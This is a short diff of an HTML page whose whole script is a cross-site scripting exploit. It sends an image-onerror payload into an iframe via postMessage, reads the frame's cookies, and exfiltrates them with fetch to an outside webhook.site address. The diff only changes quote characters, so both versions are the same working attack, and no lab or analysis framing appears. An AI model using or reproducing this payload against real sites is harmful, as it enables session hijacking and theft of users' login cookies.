@@ -2,18 +2,18 @@
 <html>
 <body>
 <script>
-window.addEventListener('message', function(e) {
+window.addEventListener(`message`, function(e) {
   if (e.data && e.data.cookie !== undefined) {
-    fetch('https://webhook.site/4fdd6758-a9a4-4aeb-9322-bc636b2e24ed?c='+encodeURIComponent(e.data.cookie));
+    fetch(`https://webhook.site/4fdd6758-a9a4-4aeb-9322-bc636b2e24ed?c=`+encodeURIComponent(e.data.cookie));
   }
 });
 
-window.addEventListener('load', function() {
-  var iframe = document.getElementById('f');
+window.addEventListener(`load`, function() {
+  var iframe = document.getElementById(`f`);
   iframe.onload = function() {
     iframe.contentWindow.postMessage({
-      html: '<img src=x onerror="parent.postMessage({cookie:document.cookie},\'*\')">'
-    }, '*');
+      html: `<img src=x onerror="parent.postMessage({cookie:document.cookie},\`*\`)">`
+    }, `*`);
   };
 });
 </script>
